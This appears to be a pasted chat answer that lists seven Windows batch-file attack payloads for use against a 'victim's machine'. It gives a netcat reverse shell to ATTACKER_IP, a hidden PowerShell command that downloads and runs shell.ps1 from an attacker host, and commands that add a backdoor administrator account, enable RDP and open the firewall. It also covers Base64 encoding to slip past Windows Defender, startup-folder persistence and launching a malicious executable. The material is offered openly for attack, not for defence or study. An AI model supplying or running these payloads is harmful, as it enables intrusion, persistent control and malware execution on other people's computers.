1️⃣ Basic RCE Batch File Payload
This batch script executes commands on the target system:

bat
Copy
Edit
@echo off
cmd /k
📌 When executed, this opens an interactive command prompt (cmd.exe) on the victim's machine.

2️⃣ Reverse Shell Using Netcat
If Netcat (nc.exe) is available on the target, you can use it to get a reverse shell:

bat
Copy
Edit
@echo off
nc -e cmd.exe ATTACKER_IP ATTACKER_PORT
📌 Replace:

ATTACKER_IP → Your Kali Linux or VPS IP
ATTACKER_PORT → A listening port
Start a Listener on Your Machine:
bash
Copy
Edit
nc -lvnp ATTACKER_PORT
3️⃣ PowerShell-Based Reverse Shell
If PowerShell is enabled, use this .bat script:

bat
Copy
Edit
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
📌 This downloads and executes a remote PowerShell script (such as a Metasploit payload).

Hosting the Payload (Python Server)
Run this on Kali Linux to host shell.ps1:

bash
Copy
Edit
python3 -m http.server 80
4️⃣ Adding User and Enabling RDP for Persistence
This payload creates a new admin user and enables RDP:

bat
Copy
Edit
@echo off
net user hacker P@ssw0rd123 /add
net localgroup administrators hacker /add
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall set service type=remoteadmin mode=enable
📌 Login via RDP:

bash
Copy
Edit
mstsc /v:TARGET_IP
5️⃣ Bypassing Windows Defender
If Defender blocks payloads, encode them using Base64:

bat
Copy
Edit
powershell -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAbQBkAC4AZQB4AGUA
📌 Encode commands using:

powershell
Copy
Edit
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("YOUR_COMMAND_HERE"))
6️⃣ Windows Persistence via Startup Folder
Add a backdoor .bat file that executes at startup:

bat
Copy
Edit
copy evil.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
7️⃣ Executing Malicious EXE via Batch File
To run malware (meterpreter.exe):

bat
Copy
Edit
@echo off
start C:\Users\Public\malicious.exe
